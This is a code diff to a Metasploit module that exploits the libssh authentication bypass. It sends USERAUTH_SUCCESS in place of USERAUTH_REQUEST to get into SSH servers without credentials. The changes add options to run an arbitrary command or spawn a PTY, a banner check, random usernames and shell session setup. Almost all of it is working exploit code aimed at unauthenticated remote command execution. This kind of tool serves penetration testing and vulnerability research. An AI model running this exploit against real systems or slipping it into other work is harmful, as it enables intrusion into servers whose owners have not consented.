@@ -14,11 +14,16 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'libssh Authentication Bypass Scanner',
       'Description'    => %q{
-        "libssh versions 0.6 and above have an authentication bypass vulnerability in
-        the server code.  By presenting the server an SSH2_MSG_USERAUTH_SUCCESS message
-        in place of the SSH2_MSG_USERAUTH_REQUEST message which the server would expect
-        to initiate authentication, the attacker could successfully authentciate [sic]
-        without any credentials."
+        This module exploits an authentication bypass in libssh server code
+        where a USERAUTH_SUCCESS message is sent in place of the expected
+        USERAUTH_REQUEST message. Versions 0.6 and later are affected.
+
+        Note that this module's success depends on whether the server code
+        can trigger the correct (shell/exec) callbacks despite only the state
+        machine's authenticated state being set.
+
+        Therefore, you may or may not get a shell if the server requires
+        additional code paths to be followed.
       },
       'Author'         => [
         'Peter Winter-Smith', # Discovery
@@ -34,7 +39,9 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options([
       Opt::RPORT(22),
-      OptString.new('USERNAME', [true, 'SSH username'])
+      OptString.new('CMD',        [false, 'Command to execute']),
+      OptBool.new('SPAWN_PTY',    [false, 'Spawn a PTY', false]),
+      OptBool.new('CHECK_BANNER', [false, 'Check banner for "libssh"', true])
     ])
 
     register_advanced_options([
@@ -60,6 +67,8 @@ class MetasploitModule < Msf::Auxiliary
 
     ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
 
+    print_status("#{ip}:#{rport} - Attempting authentication bypass")
+
     begin
       ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
         Net::SSH.start(ip, username, ssh_opts)
@@ -71,9 +80,13 @@ class MetasploitModule < Msf::Auxiliary
 
     return unless ssh
 
-    print_good("#{ip}:#{rport} - Logged in as #{username}")
-
     version = ssh.transport.server_version.version
+
+    # XXX: The OOB authentication leads to false positives, so check banner
+    if datastore['CHECK_BANNER'] && !version.include?('libssh')
+      print_error("#{ip}:#{rport} - #{version} does not appear to be libssh")
+      return
+    end
 
     report_vuln(
       host: ip,
@@ -82,20 +95,17 @@ class MetasploitModule < Msf::Auxiliary
       info: version
     )
 
-    shell = Net::SSH::CommandStream.new(ssh)
+    shell = Net::SSH::CommandStream.new(ssh, *config)
 
-    return unless shell
+    # XXX: Wait for CommandStream to log a channel request failure
+    sleep 0.1
 
-    info = "libssh Authentication Bypass (#{version})"
+    if shell.error
+      print_error("#{ip}:#{rport} - #{shell.error}")
+      return
+    end
 
-    ds_merge = {
-      'USERNAME' => username
-    }
-
-    start_session(self, info, ds_merge, false, shell.lsock)
-
-    # XXX: Ruby segfaults if we don't remove the SSH socket
-    remove_socket(ssh.transport.socket)
+    start_session(self, "#{self.name} (#{version})", {}, false, shell.lsock)
   end
 
   def rport
@@ -103,7 +113,14 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def username
-    datastore['USERNAME']
+    Rex::Text.rand_text_alphanumeric(8..42)
+  end
+
+  def config
+    [
+      datastore['CMD'],
+      pty: datastore['SPAWN_PTY']
+    ]
   end
 
 end
